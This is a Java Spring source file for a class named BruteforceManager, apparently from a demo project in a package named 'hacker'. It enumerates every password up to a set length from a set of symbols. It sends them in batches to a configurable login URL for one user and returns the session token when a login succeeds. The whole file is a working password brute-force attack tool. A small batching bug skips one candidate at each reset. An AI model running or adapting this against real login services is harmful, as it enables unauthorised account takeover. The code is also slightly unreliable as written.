package ch.lalumash.hacker.manager;

import ch.lalumash.core.LoginDto;
import ch.lalumash.core.LoginResponseDto;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.core.env.Environment;
import org.springframework.web.client.HttpStatusCodeException;
import org.springframework.web.client.RestTemplate;

import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;

public class BruteforceManager {
    private final String bruteforceUrl;
    private final String bruteforceSymbols;
    private final String bruteforceMax;
    private final String bruteforceUser;
    private final String bruteforceRequestsPer;

    @Autowired
    public BruteforceManager(Environment environment) {
        bruteforceUrl = environment.getProperty("bruteforce.url");
        bruteforceSymbols = environment.getProperty("bruteforce.symbols");
        bruteforceMax = environment.getProperty("bruteforce.max");
        bruteforceUser = environment.getProperty("bruteforce.user");
        bruteforceRequestsPer = environment.getProperty("bruteforce.requests-per");
    }

    public String bruteforce() {
        System.out.println("start gen...");
        genAll(bruteforceSymbols.toCharArray(), Integer.parseInt(bruteforceMax));
        System.out.println("generated: " + comb.size());

        List<LoginDto> dtos = new ArrayList<>();
        int i = 0;
        int totalCount = 0;
        for (String s : comb) {
            totalCount++;
            System.out.println(s);
            if (i > Integer.parseInt(bruteforceRequestsPer)) {
                String r = sendRequests(dtos);
                if (r != null) {
                    return r + "; requests sent: " + totalCount;
                }
                i = 0;
                dtos.clear();
            } else {
                dtos.add(new LoginDto(bruteforceUser, s));
                i++;
            }
        }

        if (dtos.size() > 0) {
            System.out.println("total requests: " + comb.size());
            String r = sendRequests(dtos);
            if (r != null) {
                return r + "; requests sent: " + totalCount;
            }
        }
        return null;
    }

    private String sendRequests(List<LoginDto> loginDtos) {
        try {
            System.out.println("sending request with " + loginDtos.size() + " login data.");
            LoginResponseDto lgu = new RestTemplate().postForObject(bruteforceUrl, loginDtos, LoginResponseDto.class);
            System.out.println(lgu);
            assert lgu != null;
            return lgu.getToken();
        } catch (HttpStatusCodeException ignored) {
        } catch (Exception exception) {
            exception.printStackTrace();
        }
        return null;
    }

    static HashSet<String> comb = new HashSet<>();

    static void genAll(char[] set, int k) {
        for (int i = 1; i <= k; i++) {
            gen(set, i);
        }
    }

    static void gen(char[] set, int k) {
        int n = set.length;
        printAllKLengthRec(set, "", n, k);
    }

    static void printAllKLengthRec(char[] set,
                                   String prefix,
                                   int n, int k) {
        if (k == 0) {
            comb.add(prefix);
            return;
        }

        for (int i = 0; i < n; ++i) {
            String newPrefix = prefix + set[i];
            printAllKLengthRec(set, newPrefix,
                    n, k - 1);
        }
    }
}
